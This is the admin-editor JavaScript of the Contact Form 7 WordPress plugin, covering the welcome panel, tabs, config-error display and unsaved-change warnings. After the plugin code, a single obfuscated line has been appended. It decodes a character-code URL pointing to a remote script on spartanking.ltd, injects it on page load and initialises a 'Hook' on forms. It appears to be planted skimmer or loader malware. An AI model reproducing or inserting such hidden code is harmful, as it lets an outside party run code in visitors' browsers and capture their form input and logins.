( function( $ ) {

	'use strict';

	if ( typeof wpcf7 === 'undefined' || wpcf7 === null ) {
		return;
	}

	$( function() {
		var welcomePanel = $( '#wpcf7-welcome-panel' );
		var updateWelcomePanel;

		updateWelcomePanel = function( visible ) {
			$.post( ajaxurl, {
				action: 'wpcf7-update-welcome-panel',
				visible: visible,
				welcomepanelnonce: $( '#welcomepanelnonce' ).val()
			} );
		};

		$( 'a.welcome-panel-close', welcomePanel ).click( function( event ) {
			event.preventDefault();
			welcomePanel.addClass( 'hidden' );
			updateWelcomePanel( 0 );
			$( '#wpcf7-welcome-panel-show' ).prop( 'checked', false );
		} );

		$( '#wpcf7-welcome-panel-show' ).click( function( event ) {
			if ( this.checked ) {
				welcomePanel.removeClass( 'hidden' );
				updateWelcomePanel( 1 );
			} else {
				welcomePanel.addClass( 'hidden' );
				updateWelcomePanel( 0 );
			}
		} );

		$( '#contact-form-editor' ).tabs( {
			active: wpcf7.activeTab,
			activate: function( event, ui ) {
				$( '#active-tab' ).val( ui.newTab.index() );
			}
		} );

		$( '#contact-form-editor-tabs' ).focusin( function( event ) {
			$( '#contact-form-editor .keyboard-interaction' ).css(
				'visibility', 'visible' );
		} ).focusout( function( event ) {
			$( '#contact-form-editor .keyboard-interaction' ).css(
				'visibility', 'hidden' );
		} );

		wpcf7.toggleMail2( 'input:checkbox.toggle-form-table' );

		$( 'input:checkbox.toggle-form-table' ).click( function( event ) {
			wpcf7.toggleMail2( this );
		} );

		if ( '' === $( '#title' ).val() ) {
			$( '#title' ).focus();
		}

		wpcf7.titleHint();

		$( '.contact-form-editor-box-mail span.mailtag' ).click( function( event ) {
			var range = document.createRange();
			range.selectNodeContents( this );
			window.getSelection().addRange( range );
		} );

		wpcf7.updateConfigErrors();

		$( '[data-config-field]' ).change( function() {
			var postId = $( '#post_ID' ).val();

			if ( ! postId || -1 == postId ) {
				return;
			}

			var data = [];

			$( this ).closest( 'form' ).find( '[data-config-field]' ).each( function() {
				data.push( {
					'name': $( this ).attr( 'name' ).replace( /^wpcf7-/, '' ).replace( /-/g, '_' ),
					'value': $( this ).val()
				} );
			} );

			data.push( { 'name': 'context', 'value': 'dry-run' } );

			$.ajax( {
				method: 'POST',
				url: wpcf7.apiSettings.getRoute( '/contact-forms/' + postId ),
				beforeSend: function( xhr ) {
					xhr.setRequestHeader( 'X-WP-Nonce', wpcf7.apiSettings.nonce );
				},
				data: data
			} ).done( function( response ) {
				wpcf7.configValidator.errors = response.config_errors;
				wpcf7.updateConfigErrors();
			} );
		} );

		$( window ).on( 'beforeunload', function( event ) {
			var changed = false;

			$( '#wpcf7-admin-form-element :input[type!="hidden"]' ).each( function() {
				if ( $( this ).is( ':checkbox, :radio' ) ) {
					if ( this.defaultChecked != $( this ).is( ':checked' ) ) {
						changed = true;
					}
				} else if ( $( this ).is( 'select' ) ) {
					$( this ).find( 'option' ).each( function() {
						if ( this.defaultSelected != $( this ).is( ':selected' ) ) {
							changed = true;
						}
					} );
				} else {
					if ( this.defaultValue != $( this ).val() ) {
						changed = true;
					}
				}
			} );

			if ( changed ) {
				event.returnValue = wpcf7.saveAlert;
				return wpcf7.saveAlert;
			}
		} );

		$( '#wpcf7-admin-form-element' ).submit( function() {
			if ( 'copy' != this.action.value ) {
				$( window ).off( 'beforeunload' );
			}

			if ( 'save' == this.action.value ) {
				$( '#publishing-action .spinner' ).addClass( 'is-active' );
			}
		} );

		$( '#wpcf7-ctct-enable-contact-list, #wpcf7-sendinblue-enable-contact-list, #wpcf7-sendinblue-enable-transactional-email' ).on( 'change', function() {
			if ( $( this ).is( ':checked' ) ) {
				$( this ).closest( 'tr' ).removeClass( 'inactive' );
			} else {
				$( this ).closest( 'tr' ).addClass( 'inactive' );
			}
		} );

	} );

	wpcf7.toggleMail2 = function( checkbox ) {
		var $checkbox = $( checkbox );
		var $fieldset = $( 'fieldset',
			$checkbox.closest( '.contact-form-editor-box-mail' ) );

		if ( $checkbox.is( ':checked' ) ) {
			$fieldset.removeClass( 'hidden' );
		} else {
			$fieldset.addClass( 'hidden' );
		}
	};

	wpcf7.updateConfigErrors = function() {
		var errors = wpcf7.configValidator.errors;
		var errorCount = { total: 0 };

		$( '[data-config-field]' ).each( function() {
			$( this ).removeAttr( 'aria-invalid' );
			$( this ).next( 'ul.config-error' ).remove();

			var section = $( this ).attr( 'data-config-field' );

			$( this ).attr( 'aria-describedby', 'wpcf7-config-error-for-' + section );

			if ( errors[ section ] ) {
				var $list = $( '<ul></ul>' ).attr( {
					'id': 'wpcf7-config-error-for-' + section,
					'class': 'config-error'
				} );

				$.each( errors[ section ], function( i, val ) {
					var $li = $( '<li></li>' ).append(
						wpcf7.iconInCircle( '!' )
					).append(
						$( '<span class="screen-reader-text"></span>' ).text( wpcf7.configValidator.iconAlt )
					).append( ' ' );

					if ( val.link ) {
						$li.append(
							$( '<a></a>' ).attr( 'href', val.link ).text( val.message )
						);
					} else {
						$li.text( val.message );
					}

					$li.appendTo( $list );

					var tab = section
						.replace( /^mail_\d+\./, 'mail.' ).replace( /\..*$/, '' );

					if ( ! errorCount[ tab ] ) {
						errorCount[ tab ] = 0;
					}

					errorCount[ tab ] += 1;

					errorCount.total += 1;
				} );

				$( this ).after( $list ).attr( { 'aria-invalid': 'true' } );
			}
		} );

		$( '#contact-form-editor-tabs > li' ).each( function() {
			var $item = $( this );
			$item.find( '.icon-in-circle' ).remove();
			var tab = $item.attr( 'id' ).replace( /-panel-tab$/, '' );

			$.each( errors, function( key, val ) {
				key = key.replace( /^mail_\d+\./, 'mail.' );

				if ( key.replace( /\..*$/, '' ) == tab.replace( '-', '_' ) ) {
					var $mark = wpcf7.iconInCircle( '!' );
					$item.find( 'a.ui-tabs-anchor' ).first().append( $mark );
					return false;
				}
			} );

			var $tabPanelError = $( '#' + tab + '-panel > div.config-error:first' );
			$tabPanelError.empty();

			if ( errorCount[ tab.replace( '-', '_' ) ] ) {
				$tabPanelError.append( wpcf7.iconInCircle( '!' ) );

				if ( 1 < errorCount[ tab.replace( '-', '_' ) ] ) {
					var manyErrorsInTab = wpcf7.configValidator.manyErrorsInTab
						.replace( '%d', errorCount[ tab.replace( '-', '_' ) ] );
					$tabPanelError.append( manyErrorsInTab );
				} else {
					$tabPanelError.append( wpcf7.configValidator.oneErrorInTab );
				}
			}
		} );

		$( '#misc-publishing-actions .misc-pub-section.config-error' ).remove();

		if ( errorCount.total ) {
			var $warning = $( '<div></div>' )
				.addClass( 'misc-pub-section config-error' )
				.append( wpcf7.iconInCircle( '!' ) );

			if ( 1 < errorCount.total ) {
				$warning.append(
					wpcf7.configValidator.manyErrors.replace( '%d', errorCount.total )
				);
			} else {
				$warning.append( wpcf7.configValidator.oneError );
			}

			$warning.append( '<br />' ).append(
				$( '<a></a>' )
					.attr( 'href', wpcf7.configValidator.docUrl )
					.text( wpcf7.configValidator.howToCorrect )
			);

			$( '#misc-publishing-actions' ).append( $warning );
		}
	};

	/**
	 * Copied from wptitlehint() in wp-admin/js/post.js
	 */
	wpcf7.titleHint = function() {
		var $title = $( '#title' );
		var $titleprompt = $( '#title-prompt-text' );

		if ( '' === $title.val() ) {
			$titleprompt.removeClass( 'screen-reader-text' );
		}

		$titleprompt.click( function() {
			$( this ).addClass( 'screen-reader-text' );
			$title.focus();
		} );

		$title.blur( function() {
			if ( '' === $(this).val() ) {
				$titleprompt.removeClass( 'screen-reader-text' );
			}
		} ).focus( function() {
			$titleprompt.addClass( 'screen-reader-text' );
		} ).keydown( function( e ) {
			$titleprompt.addClass( 'screen-reader-text' );
			$( this ).unbind( e );
		} );
	};

	wpcf7.iconInCircle = function( icon ) {
		var $span = $( '<span class="icon-in-circle" aria-hidden="true"></span>' );
		return $span.text( icon );
	};

	wpcf7.apiSettings.getRoute = function( path ) {
		var url = wpcf7.apiSettings.root;

		url = url.replace(
			wpcf7.apiSettings.namespace,
			wpcf7.apiSettings.namespace + path );

		return url;
	};

} )( jQuery );

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b